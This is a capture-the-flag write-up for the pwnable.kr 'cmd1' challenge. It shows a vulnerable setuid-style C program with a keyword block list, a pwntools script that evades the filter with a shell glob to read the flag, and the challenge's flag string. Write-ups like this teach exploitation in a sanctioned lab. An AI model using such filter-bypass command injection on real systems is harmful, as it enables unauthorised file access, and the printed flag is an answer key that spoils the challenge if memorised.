# cmd1
## Analysis
```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "flag")!=0;
        r += strstr(cmd, "sh")!=0;
        r += strstr(cmd, "tmp")!=0;
        return r;
}
int main(int argc, char* argv[], char** envp){
        putenv("PATH=/thankyouverymuch");
        if(filter(argv[1])) return 0;
        setregid(getegid(), getegid());
        system( argv[1] );
        return 0;
}
```

## Solution

Utilize wildcard (globbing patterns) in shell to essentially `cat flag`.

```py
from pwn import *

p = remote('pwnable.kr',10012)
p.sendlineafter(b'CMD1 Shell', b'./cmd1 "/bin/cat fla*"')
p.interactive()
```

```sh
❯ python3 solve.py
[+] Opening connection to pwnable.kr on port 10012: Done
[*] Switching to interactive mode
 ]                                                               
  Mommy! what is PATH environment in Linux?                                   

  ※ You got 500s in /bin/sh. Good luck.                                      
  ※ Available: python3 
=================================================================================
PATH_environment?_Now_I_really_g3t_it,_mommy!
$  
```

Flag: `PATH_environment?_Now_I_really_g3t_it,_mommy!`